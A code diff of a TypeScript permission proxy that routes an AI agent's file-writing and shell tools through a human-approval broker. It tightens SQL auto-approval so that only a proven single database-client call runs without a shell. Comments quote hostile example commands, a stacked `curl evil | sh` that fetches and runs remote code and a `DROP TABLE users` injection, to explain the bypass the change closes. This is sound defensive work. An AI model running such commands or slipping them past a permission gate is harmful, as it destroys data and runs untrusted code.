@@ -5,9 +5,11 @@
  * Exposes write_file, edit_file, and bash tools that gate every operation
  * through the swarm server's permission system before executing.
  *
- * The agent-sdk coder/tester are launched with this server in their
- * --mcp-config; Write, Edit, and Bash are removed from --allowedTools so
- * the model is forced to use these proxied versions instead of the built-ins.
+ * Scope (be precise — this is a permission boundary, not a blanket guarantee):
+ * this proxy is attached ONLY to hired marketplace specialists whose grants
+ * carry mode:'ask' or an SQL policy (assembleSpecialistTools in agent-sdk.ts).
+ * The BUILT-IN coder runs with the native Write/Edit/Bash tools un-proxied by
+ * design — its guardrails are the worktree + gates, not this broker.
  *
  * Communication:
  *   POST {SWARM_SERVER_URL}/run/permission/request  →  long-poll until decided
@@ -23,7 +25,8 @@ import * as fs from 'node:fs';
 import * as fsp from 'node:fs/promises';
 import * as path from 'node:path';
 import * as readline from 'node:readline';
-import { execSync } from 'node:child_process';
+import { execSync, execFileSync } from 'node:child_process';
+import { classifySql, extractSql, analyzeDbCommand, policyFor } from './sql-guard.js';
 
 const serverUrl = process.env.SWARM_SERVER_URL ?? 'http://127.0.0.1:7000';
 const agentId = process.env.SWARM_AGENT_ID ?? 'unknown';
@@ -40,68 +43,8 @@ const sqlPolicy: Record<string, 'allow' | 'ask' | 'deny'> = (() => {
 })();
 
 // ─── SQL classification ───────────────────────────────────────────────────────
-
-type SqlCategory = 'read' | 'write' | 'delete' | 'destructive' | 'unknown';
-
-// Risk level per category: higher = more dangerous. Used to take the worst across statements.
-const SQL_RISK: Record<SqlCategory, number> = {
-  read: 0,
-  unknown: 1,
-  write: 1,
-  delete: 2,
-  destructive: 3,
-};
-
-function classifyOneStatement(stmt: string): SqlCategory {
-  const s = stmt
-    .trim()
-    .replace(/\/\*[\s\S]*?\*\//g, '')
-    .replace(/--[^\n]*/g, '')
-    .trim()
-    .toUpperCase();
-  if (!s) return 'read';
-  // WITH (CTEs): scan the entire statement for DML/DDL and take the most dangerous.
-  // This catches writable CTEs like: WITH d AS (DELETE ...) SELECT ...
-  if (/^WITH\b/.test(s)) {
-    const cats: SqlCategory[] = [];
-    if (/\b(INSERT|UPDATE|REPLACE|UPSERT|MERGE)\b/.test(s)) cats.push('write');
-    if (/\bDELETE\b/.test(s)) cats.push('delete');
-    if (/\b(DROP|TRUNCATE|ALTER|CREATE|RENAME)\b/.test(s)) cats.push('destructive');
-    if (/\bSELECT\b[^;]*\bINTO\b/.test(s)) cats.push('write');
-    return cats.length ? cats.reduce((w, c) => (SQL_RISK[c] > SQL_RISK[w] ? c : w)) : 'read';
-  }
-  if (/^(SELECT|SHOW|EXPLAIN|DESCRIBE|DESC|TABLE)\b/.test(s)) {
-    // SELECT ... INTO new_table creates a table — treat as write
-    return /\bINTO\b/.test(s) ? 'write' : 'read';
-  }
-  if (/^(INSERT|UPDATE|REPLACE|UPSERT|MERGE)\b/.test(s)) return 'write';
-  if (/^DELETE\b/.test(s)) return 'delete';
-  if (/^(DROP|TRUNCATE|ALTER|CREATE|RENAME|VACUUM|REINDEX|GRANT|REVOKE)\b/.test(s))
-    return 'destructive';
-  return 'unknown';
-}
-
-function classifySql(sql: string): SqlCategory {
-  // Split on semicolons and take the most dangerous category across ALL statements.
-  // Prevents stacking attacks like: psql -c "SELECT 1; DROP TABLE users"
-  const statements = sql
-    .split(/;+/)
-    .map(s => s.trim())
-    .filter(Boolean);
-  if (!statements.length) return 'unknown';
-  return statements.reduce<SqlCategory>((worst, stmt) => {
-    const cat = classifyOneStatement(stmt);
-    return SQL_RISK[cat] > SQL_RISK[worst] ? cat : worst;
-  }, 'read');
-}
-
-// Extract the SQL statement from a psql/mysql shell command, if present.
-function extractSql(command: string): string | null {
-  const m =
-    command.match(/(?:psql|pgcli)\b[^'"]*(?:-c|--command)[=\s]+['"]([^'"]+)['"]/i) ??
-    command.match(/(?:mysql|mariadb|mycli)\b[^'"]*(?:-e|--execute)[=\s]+['"]([^'"]+)['"]/i);
-  return m ? m[1] : null;
-}
+// Pure logic lives in sql-guard.ts (unit-tested). This file only wires it to
+// the permission flow.
 
 // ─── Safety ───────────────────────────────────────────────────────────────────
 
@@ -189,14 +132,21 @@ function runBash(input: Record<string, unknown>): string {
   }
 }
 
-// Apply SQL policy if SWARM_SQL_POLICY is set and the command is a DB command.
-// Returns 'allow' | 'ask' | 'deny', or null if no SQL policy applies.
-function checkSqlPolicy(input: Record<string, unknown>): 'allow' | 'ask' | 'deny' | null {
-  if (Object.keys(sqlPolicy).length === 0) return null;
-  const sql = extractSql(String(input.command ?? ''));
-  if (!sql) return null;
-  const category = classifySql(sql);
-  return sqlPolicy[category] ?? sqlPolicy['unknown'] ?? 'ask';
+// Run a PROVEN single DB invocation as an argv — no shell, so nothing outside
+// the classified SQL can execute. Only ever called with analyzeDbCommand output.
+function runDbArgv(argv: string[]): string {
+  try {
+    const output = execFileSync(argv[0], argv.slice(1), {
+      cwd: projectRoot,
+      encoding: 'utf8',
+      timeout: 120_000,
+      maxBuffer: 10 * 1024 * 1024,
+    });
+    return output || '(no output)';
+  } catch (err) {
+    const e = err as { stdout?: string; stderr?: string; message?: string };
+    return [e.stdout, e.stderr, e.message].filter(Boolean).join('\n') || 'Command failed';
+  }
 }
 
 // ─── Tool schema ──────────────────────────────────────────────────────────────
@@ -309,35 +259,52 @@ async function handleToolCall(
   name: string,
   input: Record<string, unknown>,
 ): Promise<void> {
-  // For bash commands, check SQL policy first — may auto-allow or auto-deny
-  // without bothering the user.
-  if (name === 'bash') {
-    const sqlDecision = checkSqlPolicy(input);
-    if (sqlDecision === 'allow') {
-      let result: string;
-      try {
-        result = runBash(input);
-      } catch (e) {
-        result = `Error: ${(e as Error).message}`;
+  // For bash commands with an SQL policy, try the strict auto path first.
+  // AUTO-ALLOW requires proof: the command must parse as a single DB-client
+  // invocation with no shell-active syntax, and it then runs as an argv via
+  // execFile — never through a shell. The old flow classified a substring but
+  // ran the whole original string via /bin/sh, so `psql -c "SELECT 1"; curl
+  // evil | sh` auto-ran both halves. Anything unprovable falls through to a
+  // human ask; deny policies still catch commands that merely look like SQL.
+  if (name === 'bash' && Object.keys(sqlPolicy).length > 0) {
+    const command = String(input.command ?? '');
+    const analysis = analyzeDbCommand(command);
+    if (analysis) {
+      const decision = policyFor(analysis.category, sqlPolicy);
+      if (decision === 'allow') {
+        ok(id, { content: [{ type: 'text', text: runDbArgv(analysis.argv) }], isError: false });
+        return;
       }
-      ok(id, { content: [{ type: 'text', text: result }], isError: false });
-      return;
+      if (decision === 'deny') {
+        ok(id, {
+          content: [
+            {
+              type: 'text',
+              text: `Permission denied: ${analysis.category} SQL operations are not allowed by your policy.`,
+            },
+          ],
+          isError: true,
+        });
+        return;
+      }
+      // 'ask' — fall through to the broker.
+    } else {
+      // Not provably a lone DB command. Deny still applies to anything that
+      // sniffs as SQL; everything else goes to the human.
+      const sniffed = extractSql(command);
+      if (sniffed && policyFor(classifySql(sniffed), sqlPolicy) === 'deny') {
+        ok(id, {
+          content: [
+            {
+              type: 'text',
+              text: `Permission denied: ${classifySql(sniffed)} SQL operations are not allowed by your policy.`,
+            },
+          ],
+          isError: true,
+        });
+        return;
+      }
     }
-    if (sqlDecision === 'deny') {
-      const sql = extractSql(String(input.command ?? ''));
-      const cat = sql ? classifySql(sql) : 'unknown';
-      ok(id, {
-        content: [
-          {
-            type: 'text',
-            text: `Permission denied: ${cat} SQL operations are not allowed by your policy.`,
-          },
-        ],
-        isError: true,
-      });
-      return;
-    }
-    // sqlDecision === 'ask' or null (no SQL policy) — fall through to normal broker ask
   }
 
   const decision = await askPermission(name, input);
